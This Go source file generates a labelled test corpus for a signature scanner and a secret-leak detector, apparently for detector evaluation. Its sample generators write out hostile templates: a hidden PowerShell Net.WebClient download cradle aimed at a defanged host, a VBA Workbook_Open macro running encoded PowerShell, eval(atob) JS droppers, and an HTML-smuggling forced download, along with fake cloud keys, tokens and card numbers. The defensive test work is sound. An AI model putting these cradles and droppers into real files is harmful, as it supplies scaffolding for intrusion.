package main

import (
	"fmt"
	"math/rand"
	"strings"
)

// build assembles the full labelled corpus. Per-family base counts are chosen
// so the realised blend lands near the documented ~20% malicious / ~80% benign
// target; `scale` multiplies them all for a larger corpus. Entries are created
// in a fixed family order (the caller shuffles afterwards with the same PRNG),
// so the output is deterministic for a given (seed, scale).
func build(rng *rand.Rand, scale int) []Entry {
	var out []Entry
	add := func(n int, label, engine, family string, gen func(*rand.Rand) (string, []byte)) {
		for i := 0; i < n*scale; i++ {
			desc, payload := gen(rng)
			out = append(out, Entry{
				ID:         fmt.Sprintf("%s-%s-%04d", engine, family, i),
				Label:      label,
				Engine:     engine,
				Family:     family,
				Desc:       desc,
				PayloadB64: b64(payload),
			})
		}
	}

	// ---- YARA lane: malicious (genuinely-detectable signature shapes) ----
	add(25, labelMalicious, engineYARA, "eicar", genEicar)
	add(30, labelMalicious, engineYARA, "pe_executable", genPE)
	add(20, labelMalicious, engineYARA, "elf_executable", genELF)
	add(25, labelMalicious, engineYARA, "js_eval_atob", genJSEvalAtob)
	add(20, labelMalicious, engineYARA, "js_eval_unescape", genJSEvalUnescape)
	add(15, labelMalicious, engineYARA, "js_indirect_eval", genJSIndirectEval)
	add(20, labelMalicious, engineYARA, "macro_doc", genMacroDoc)
	add(25, labelMalicious, engineYARA, "ransom_note", genRansomNote)
	add(12, labelMalicious, engineYARA, "high_entropy_marked", genHighEntropyMarked)
	add(15, labelMalicious, engineYARA, "upx_packed", genUPX)
	add(20, labelMalicious, engineYARA, "pdf_active_js", genPDFActiveJS)
	add(15, labelMalicious, engineYARA, "html_smuggle", genHTMLSmuggle)
	add(15, labelMalicious, engineYARA, "powershell_cradle", genPowerShell)
	add(15, labelMalicious, engineYARA, "vba_macro_src", genVBAMacro)
	// Honest false negatives: novel encrypted droppers with no static marker —
	// a signature scanner genuinely misses these. Their presence keeps the
	// wild catch-rate below 100% the same way real traffic would.
	add(30, labelMalicious, engineYARA, "novel_packed_evasive", genNovelPacked)

	// ---- YARA lane: benign (clean + benign-but-suspicious noise) ----
	add(240, labelBenign, engineYARA, "plain_text", genPlainText)
	add(120, labelBenign, engineYARA, "handwritten_js", genHandwrittenJS)
	add(100, labelBenign, engineYARA, "config_json", genConfigJSON)
	add(100, labelBenign, engineYARA, "static_html", genStaticHTML)
	add(80, labelBenign, engineYARA, "clean_ooxml", genCleanDocx)
	add(90, labelBenign, engineYARA, "static_pdf", genStaticPDF)
	add(70, labelBenign, engineYARA, "stylesheet_css", genCSS)
	add(70, labelBenign, engineYARA, "tabular_csv", genCSV)
	// Benign-but-suspicious: legitimate downloads/scripts that a signature
	// engine flags under elevated-risk inspection (honest false positives).
	add(60, labelBenign, engineYARA, "benign_pe_installer", genBenignPEInstaller)
	add(40, labelBenign, engineYARA, "benign_elf_binary", genBenignELF)
	add(40, labelBenign, engineYARA, "benign_js_fromcharcode", genBenignFromCharCode)
	add(30, labelBenign, engineYARA, "benign_pdf_form", genBenignPDFForm)

	// ---- DLP lane: malicious (secret / PII exfiltration in content) ----
	add(40, labelMalicious, engineDLP, "credit_card", genCreditCard)
	add(25, labelMalicious, engineDLP, "aws_access_key_id", genAWSKey)
	add(20, labelMalicious, engineDLP, "google_api_key", genGoogleKey)
	add(20, labelMalicious, engineDLP, "github_token", genGitHubToken)
	add(15, labelMalicious, engineDLP, "slack_token", genSlackToken)
	add(15, labelMalicious, engineDLP, "stripe_secret_key", genStripeKey)
	add(20, labelMalicious, engineDLP, "private_key_block", genPrivateKey)

	// ---- DLP lane: benign (prose + near-miss tokens the validators suppress) ----
	add(300, labelBenign, engineDLP, "business_prose", genBusinessProse)
	add(60, labelBenign, engineDLP, "nearmiss_credit_card", genNearMissCard)
	add(40, labelBenign, engineDLP, "nearmiss_aws", genNearMissAWS)
	add(80, labelBenign, engineDLP, "random_token", genRandomToken)
	add(30, labelBenign, engineDLP, "placeholder_key", genPlaceholderKey)
	add(80, labelBenign, engineDLP, "short_numbers", genShortNumbers)

	return out
}

// ===== payload primitives ==================================================

const alnum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
const upperNum = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
const b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
const urlsafe = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"

func pick(rng *rand.Rand, set string, n int) string {
	var sb strings.Builder
	sb.Grow(n)
	for i := 0; i < n; i++ {
		sb.WriteByte(set[rng.Intn(len(set))])
	}
	return sb.String()
}

func randDigits(rng *rand.Rand, n int) string {
	var sb strings.Builder
	sb.Grow(n)
	for i := 0; i < n; i++ {
		sb.WriteByte(byte('0' + rng.Intn(10)))
	}
	return sb.String()
}

// EICAR is assembled at runtime so this generator's own source is not flagged
// by a host scanner (the same trick the sibling gen_samples.py uses).
func eicarString() string {
	return "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" + "!$H+H*"
}

var wordBank = []string{
	"quarterly", "revenue", "region", "summary", "attached", "spreadsheet",
	"meeting", "schedule", "project", "milestone", "deliverable", "review",
	"customer", "invoice", "shipment", "warehouse", "inventory", "forecast",
	"engineering", "deployment", "rollout", "incident", "postmortem", "metric",
	"dashboard", "latency", "throughput", "capacity", "roadmap", "backlog",
	"compliance", "policy", "audit", "renewal", "contract", "proposal",
}

func sentence(rng *rand.Rand, words int) string {
	parts := make([]string, words)
	for i := range parts {
		parts[i] = wordBank[rng.Intn(len(wordBank))]
	}
	s := strings.Join(parts, " ")
	return strings.ToUpper(s[:1]) + s[1:] + "."
}

func prose(rng *rand.Rand, sentences int) string {
	parts := make([]string, sentences)
	for i := range parts {
		parts[i] = sentence(rng, 6+rng.Intn(8))
	}
	return strings.Join(parts, " ")
}

// ===== YARA malicious generators ===========================================

func genEicar(rng *rand.Rand) (string, []byte) {
	body := fmt.Sprintf("Attachment %s scanned: %s -- %s", pick(rng, alnum, 6), eicarString(), prose(rng, 1))
	return "EICAR test-file marker embedded in an attachment", []byte(body)
}

func genPE(rng *rand.Rand) (string, []byte) {
	peOff := 0x80 + rng.Intn(0x180) // 0x80..0x200
	buf := make([]byte, peOff+4+rng.Intn(256))
	fillRandom(rng, buf)
	buf[0], buf[1] = 'M', 'Z'
	putU32LE(buf[0x3C:], uint32(peOff))
	buf[peOff], buf[peOff+1], buf[peOff+2], buf[peOff+3] = 'P', 'E', 0, 0
	return "Windows PE executable (MZ + PE header)", buf
}

func genELF(rng *rand.Rand) (string, []byte) {
	buf := make([]byte, 64+rng.Intn(192))
	fillRandom(rng, buf)
	buf[0], buf[1], buf[2], buf[3] = 0x7F, 'E', 'L', 'F'
	return "ELF executable (0x7F ELF magic)", buf
}

func genJSEvalAtob(rng *rand.Rand) (string, []byte) {
	js := fmt.Sprintf("var _p=\"%s\";\neval(atob(_p));\n// %s\n", pick(rng, b64chars, 40+rng.Intn(40)), pick(rng, alnum, 8))
	return "obfuscated JS dropper: eval(atob(...))", []byte(js)
}

func genJSEvalUnescape(rng *rand.Rand) (string, []byte) {
	var enc strings.Builder
	for i := 0; i < 24; i++ {
		fmt.Fprintf(&enc, "%%%02x", rng.Intn(256))
	}
	js := fmt.Sprintf("eval(unescape('%s'));\n", enc.String())
	return "obfuscated JS dropper: eval(unescape(...))", []byte(js)
}

func genJSIndirectEval(rng *rand.Rand) (string, []byte) {
	blob := pick(rng, b64chars, 32)
	forms := []string{
		fmt.Sprintf("Function(atob(\"%s\"))();\n", blob),
		fmt.Sprintf("setTimeout(atob(\"%s\"), 0);\n", blob),
		fmt.Sprintf("window[\"eval\"](atob(\"%s\"));\n", blob),
		fmt.Sprintf("var f=this[\"ev\"+\"al\"]; f(\"%s\");\n", blob),
	}
	js := forms[rng.Intn(len(forms))]
	return "eval-equivalent runtime decode (Function/setTimeout/indirect eval)", []byte(js)
}

func genMacroDoc(rng *rand.Rand) (string, []byte) {
	hooks := []string{"Workbook_Open", "Document_Open", "Auto_Open", "AutoOpen"}
	buf := []byte{0x50, 0x4B, 0x03, 0x04} // PK\x03\x04 at offset 0
	buf = append(buf, []byte(fmt.Sprintf("....word/vbaProject.bin....%s....%s....", hooks[rng.Intn(len(hooks))], pick(rng, alnum, 12)))...)
	return "macro-enabled OOXML document (vbaProject.bin)", buf
}

func genRansomNote(rng *rand.Rand) (string, []byte) {
	markers := []string{
		"all your files are encrypted",
		"to decrypt your files",
		"pay the ransom",
		"send the payment in bitcoin",
		"visit our site at hxxp://recover.onion",
		"your documents now use the .locked extension",
	}
	rng.Shuffle(len(markers), func(i, j int) { markers[i], markers[j] = markers[j], markers[i] })
	n := 2 + rng.Intn(3)
	note := "!!! ATTENTION !!!\n" + strings.Join(markers[:n], "\n") + "\n" + prose(rng, 1)
	return "ransomware ransom note (>=2 markers)", []byte(note)
}

func genHighEntropyMarked(rng *rand.Rand) (string, []byte) {
	markers := []string{"README_FOR_DECRYPT", "HOW_TO_DECRYPT"}
	buf := make([]byte, 0, 8192+32)
	buf = append(buf, []byte(markers[rng.Intn(len(markers))])...)
	// Full-period LCG high byte -> near-uniform 0..255 (entropy ~8.0).
	x := rng.Uint32() | 1
	for i := 0; i < 8192; i++ {
		x = x*1664525 + 1013904223
		buf = append(buf, byte(x>>24))
	}
	return "high-entropy payload with decrypt-instructions marker", buf
}

func genUPX(rng *rand.Rand) (string, []byte) {
	buf := make([]byte, 256+rng.Intn(256))
	fillRandom(rng, buf)
	buf[0], buf[1] = 'M', 'Z' // executable header so the packer rule pairs correctly
	copy(buf[64:], []byte("UPX0"))
	copy(buf[128:], []byte("UPX1"))
	copy(buf[192:], []byte("UPX!"))
	return "UPX-packed executable (MZ + UPX markers)", buf
}

func genPDFActiveJS(rng *rand.Rand) (string, []byte) {
	pdf := fmt.Sprintf("%%PDF-1.7\n1 0 obj<< /Type /Catalog /OpenAction 2 0 R >>endobj\n"+
		"2 0 obj<< /S /JavaScript /JS (app.alert('%s');) >>endobj\ntrailer<< /Root 1 0 R >>", pick(rng, alnum, 6))
	return "PDF with auto-executing JavaScript (/OpenAction + /JavaScript)", []byte(pdf)
}

func genHTMLSmuggle(rng *rand.Rand) (string, []byte) {
	blob := pick(rng, b64chars, 140+rng.Intn(60))
	html := fmt.Sprintf("<!doctype html><html><body><script>\n"+
		"var b=atob(\"%s\");\nvar blob=new Blob([b]);\nvar u=URL.createObjectURL(blob);\n"+
		"var a=document.createElement('a');a.href=u;a.download='update.bin';a.click();\n"+
		"</script></body></html>", blob)
	return "HTML smuggling: atob -> Blob -> forced download", []byte(html)
}

func genPowerShell(rng *rand.Rand) (string, []byte) {
	if rng.Intn(2) == 0 {
		ps := fmt.Sprintf("powershell -NoProfile -EncodedCommand %s\n", pick(rng, b64chars, 44+rng.Intn(40)))
		return "PowerShell -EncodedCommand cradle", []byte(ps)
	}
	ps := fmt.Sprintf("powershell -w hidden -c \"(New-Object Net.WebClient).DownloadString('hxxp://%s/a')\"\n", pick(rng, alnum, 8))
	return "PowerShell Net.WebClient download cradle", []byte(ps)
}

func genVBAMacro(rng *rand.Rand) (string, []byte) {
	src := fmt.Sprintf("Sub Workbook_Open()\n  Dim s\n  Set s = CreateObject(\"WScript.Shell\")\n"+
		"  s.Run \"powershell -enc %s\"\nEnd Sub\n", pick(rng, b64chars, 40))
	return "VBA macro source: Workbook_Open + CreateObject(WScript.Shell)", []byte(src)
}

func genNovelPacked(rng *rand.Rand) (string, []byte) {
	// High-entropy bytes with NO recognisable header or marker: a novel
	// encrypted dropper the signature engine cannot see. Labelled malicious
	// on purpose -> an honest false negative.
	buf := make([]byte, 2048+rng.Intn(2048))
	x := rng.Uint32() | 1
	for i := range buf {
		x = x*1664525 + 1013904223
		buf[i] = byte(x >> 24)
	}
	// Ensure no accidental executable magic at offset 0.
	if buf[0] == 'M' || buf[0] == 0x7F || buf[0] == 0x50 {
		buf[0] = 0x42
	}
	return "novel encrypted dropper, no static signature (evasive)", buf
}

// ===== YARA benign generators ==============================================

func genPlainText(rng *rand.Rand) (string, []byte) {
	return "plain business prose", []byte(prose(rng, 3+rng.Intn(4)))
}

func genHandwrittenJS(rng *rand.Rand) (string, []byte) {
	js := fmt.Sprintf("function add(a, b) { return a + b; }\n"+
		"const xs = [%d, %d, %d];\nconst total = xs.reduce(add, 0);\nconsole.log('total', total);\n",
		rng.Intn(100), rng.Intn(100), rng.Intn(100))
	return "hand-written JavaScript (no obfuscation)", []byte(js)
}

func genConfigJSON(rng *rand.Rand) (string, []byte) {
	j := fmt.Sprintf("{\n  \"service\": \"%s\",\n  \"replicas\": %d,\n  \"region\": \"%s\",\n  \"enabled\": true\n}\n",
		wordBank[rng.Intn(len(wordBank))], 1+rng.Intn(8), wordBank[rng.Intn(len(wordBank))])
	return "application config JSON", []byte(j)
}

func genStaticHTML(rng *rand.Rand) (string, []byte) {
	h := fmt.Sprintf("<!doctype html><html><head><title>%s</title></head>"+
		"<body><h1>Welcome</h1><p>%s</p></body></html>", wordBank[rng.Intn(len(wordBank))], sentence(rng, 8))
	return "static HTML page", []byte(h)
}

func genCleanDocx(rng *rand.Rand) (string, []byte) {
	// PK at offset 0 but only ordinary OOXML parts and NO vbaProject.bin.
	buf := []byte{0x50, 0x4B, 0x03, 0x04}
	buf = append(buf, []byte(fmt.Sprintf("....word/document.xml....[Content_Types].xml....word/styles.xml....%s....", pick(rng, alnum, 10)))...)
	return "macro-free OOXML document", buf
}

func genStaticPDF(rng *rand.Rand) (string, []byte) {
	p := fmt.Sprintf("%%PDF-1.7\n1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj\n"+
		"2 0 obj<< /Type /Pages /Count 1 >>endobj\n%% %s\ntrailer<< /Root 1 0 R >>", pick(rng, alnum, 8))
	return "static PDF (catalog only, no JavaScript)", []byte(p)
}

func genCSS(rng *rand.Rand) (string, []byte) {
	c := fmt.Sprintf(".%s { color: #%s; margin: %dpx; }\n", wordBank[rng.Intn(len(wordBank))], pick(rng, "0123456789abcdef", 6), rng.Intn(40))
	return "stylesheet (CSS)", []byte(c)
}

func genCSV(rng *rand.Rand) (string, []byte) {
	var sb strings.Builder
	sb.WriteString("id,name,amount\n")
	for i := 0; i < 4; i++ {
		fmt.Fprintf(&sb, "%d,%s,%d.%02d\n", i+1, wordBank[rng.Intn(len(wordBank))], rng.Intn(900), rng.Intn(100))
	}
	return "tabular data (CSV)", []byte(sb.String())
}

func genBenignPEInstaller(rng *rand.Rand) (string, []byte) {
	_, b := genPE(rng)
	return "legitimate software installer (PE) — flagged suspicious under elevated-risk", b
}

func genBenignELF(rng *rand.Rand) (string, []byte) {
	_, b := genELF(rng)
	return "legitimate Linux binary (ELF) — flagged suspicious under elevated-risk", b
}

func genBenignFromCharCode(rng *rand.Rand) (string, []byte) {
	// Real apps legitimately use String.fromCharCode (e.g. decoding key codes).
	js := fmt.Sprintf("function keyName(code) { return String.fromCharCode(code); }\n"+
		"console.log(keyName(%d));\n", 65+rng.Intn(26))
	return "benign JS using String.fromCharCode — flagged suspicious", []byte(js)
}

func genBenignPDFForm(rng *rand.Rand) (string, []byte) {
	// A legitimate interactive PDF form carries /JavaScript for field
	// validation — content-indistinguishable from a malicious active PDF.
	p := fmt.Sprintf("%%PDF-1.7\n1 0 obj<< /Type /Catalog /AcroForm 3 0 R >>endobj\n"+
		"3 0 obj<< /Fields [] /JS (if (event.value < 0) event.value = 0;) >>endobj\n%% %s\ntrailer<< /Root 1 0 R >>", pick(rng, alnum, 6))
	return "legitimate interactive PDF form with field-validation JS", []byte(p)
}

// ===== DLP malicious generators ============================================

func genCreditCard(rng *rand.Rand) (string, []byte) {
	pan := luhnPAN(rng, 16)
	text := fmt.Sprintf("Customer payment on file: card %s, exp 0%d/%d. %s",
		pan, 1+rng.Intn(9), 26+rng.Intn(4), prose(rng, 1))
	return "content carrying a Luhn-valid 16-digit card number", []byte(text)
}

func genAWSKey(rng *rand.Rand) (string, []byte) {
	prefix := []string{"AKIA", "ASIA"}[rng.Intn(2)]
	key := prefix + pick(rng, upperNum, 16)
	text := fmt.Sprintf("export AWS_ACCESS_KEY_ID=%s\nexport AWS_REGION=us-east-1\n# %s", key, sentence(rng, 5))
	return "content leaking an AWS access key id", []byte(text)
}

func genGoogleKey(rng *rand.Rand) (string, []byte) {
	key := "AIza" + pick(rng, urlsafe[:len(urlsafe)-2], 34) + pick(rng, alnum, 1) // end on alnum for \b
	text := fmt.Sprintf("const MAPS_KEY = \"%s\";\n// %s", key, sentence(rng, 5))
	return "content leaking a Google API key", []byte(text)
}

func genGitHubToken(rng *rand.Rand) (string, []byte) {
	prefix := []string{"ghp", "gho", "ghu", "ghs", "ghr"}[rng.Intn(5)]
	tok := prefix + "_" + pick(rng, alnum, 36)
	text := fmt.Sprintf("GITHUB_TOKEN=%s used in CI. %s", tok, sentence(rng, 5))
	return "content leaking a GitHub token", []byte(text)
}

func genSlackToken(rng *rand.Rand) (string, []byte) {
	kind := []string{"xoxb", "xoxa", "xoxp", "xoxr", "xoxs"}[rng.Intn(5)]
	tok := kind + "-" + randDigits(rng, 11) + "-" + randDigits(rng, 12) + "-" + pick(rng, alnum, 24)
	text := fmt.Sprintf("slack webhook token %s in the deploy script. %s", tok, sentence(rng, 5))
	return "content leaking a Slack token", []byte(text)
}

func genStripeKey(rng *rand.Rand) (string, []byte) {
	kind := []string{"sk", "rk"}[rng.Intn(2)]
	key := kind + "_live_" + pick(rng, alnum, 24)
	text := fmt.Sprintf("STRIPE_SECRET_KEY=%s\n# %s", key, sentence(rng, 5))
	return "content leaking a Stripe live secret key", []byte(text)
}

func genPrivateKey(rng *rand.Rand) (string, []byte) {
	kind := []string{"RSA ", "EC ", "OPENSSH ", ""}[rng.Intn(4)]
	var body strings.Builder
	for i := 0; i < 4; i++ {
		body.WriteString(pick(rng, b64chars, 64))
		body.WriteByte('\n')
	}
	pem := fmt.Sprintf("-----BEGIN %sPRIVATE KEY-----\n%s-----END %sPRIVATE KEY-----\n", kind, body.String(), kind)
	return "content carrying a PEM private-key block", []byte(pem)
}

// ===== DLP benign generators ===============================================

func genBusinessProse(rng *rand.Rand) (string, []byte) {
	return "ordinary business prose (no secrets)", []byte(prose(rng, 3+rng.Intn(4)))
}

func genNearMissCard(rng *rand.Rand) (string, []byte) {
	pan := brokenLuhnPAN(rng, 16)
	text := fmt.Sprintf("Reference number %s (internal ledger id, not a card). %s", pan, sentence(rng, 5))
	return "16-digit number that fails the Luhn check (must be suppressed)", []byte(text)
}

func genNearMissAWS(rng *rand.Rand) (string, []byte) {
	// Wrong length / lowercase body so neither the regex nor the validator
	// accepts it.
	bad := "AKIA" + strings.ToLower(pick(rng, upperNum, 16))
	if rng.Intn(2) == 0 {
		bad = "AKIA" + pick(rng, upperNum, 14) // too short
	}
	text := fmt.Sprintf("legacy placeholder key %s in an old README. %s", bad, sentence(rng, 5))
	return "AWS-shaped near miss (wrong length/charset, must be suppressed)", []byte(text)
}

func genRandomToken(rng *rand.Rand) (string, []byte) {
	// A long random alphanumeric (build id / nonce) with no known prefix.
	text := fmt.Sprintf("build artifact %s-%s archived. %s", pick(rng, alnum, 8), pick(rng, alnum, 28), sentence(rng, 5))
	return "random alphanumeric build id (no secret prefix)", []byte(text)
}

func genPlaceholderKey(rng *rand.Rand) (string, []byte) {
	// Empty / truncated armor: matches the regex but the validator rejects it
	// (body has fewer than 64 non-whitespace bytes).
	pem := "-----BEGIN PRIVATE KEY----------END PRIVATE KEY-----\n"
	text := fmt.Sprintf("docs sample:\n%s%s", pem, sentence(rng, 4))
	return "empty PEM placeholder block (must be suppressed)", []byte(text)
}

func genShortNumbers(rng *rand.Rand) (string, []byte) {
	text := fmt.Sprintf("Order #%s shipped; tracking %s. %s",
		randDigits(rng, 6), randDigits(rng, 9), sentence(rng, 6))
	return "short order / tracking numbers (no card-length runs)", []byte(text)
}

// ===== byte / check-digit helpers ==========================================

func fillRandom(rng *rand.Rand, b []byte) {
	for i := range b {
		b[i] = byte(rng.Intn(256))
	}
}

func putU32LE(b []byte, v uint32) {
	b[0] = byte(v)
	b[1] = byte(v >> 8)
	b[2] = byte(v >> 16)
	b[3] = byte(v >> 24)
}

// luhnDigit returns the check digit that makes body Luhn-valid.
func luhnDigit(body []int) int {
	sum := 0
	double := true // body's last digit is doubled when the check digit is appended
	for i := len(body) - 1; i >= 0; i-- {
		v := body[i]
		if double {
			v *= 2
			if v > 9 {
				v -= 9
			}
		}
		sum += v
		double = !double
	}
	return (10 - (sum % 10)) % 10
}

// luhnPAN returns an n-digit Luhn-valid numeric string (n >= 2).
func luhnPAN(rng *rand.Rand, n int) string {
	body := make([]int, n-1)
	body[0] = 4 // a plausible leading industry digit (non-zero)
	for i := 1; i < len(body); i++ {
		body[i] = rng.Intn(10)
	}
	check := luhnDigit(body)
	var sb strings.Builder
	for _, d := range body {
		sb.WriteByte(byte('0' + d))
	}
	sb.WriteByte(byte('0' + check))
	return sb.String()
}

// brokenLuhnPAN returns an n-digit numeric string that deliberately FAILS Luhn.
func brokenLuhnPAN(rng *rand.Rand, n int) string {
	s := []byte(luhnPAN(rng, n))
	last := s[n-1] - '0'
	s[n-1] = byte('0' + (last+1)%10) // perturb the check digit
	return string(s)
}
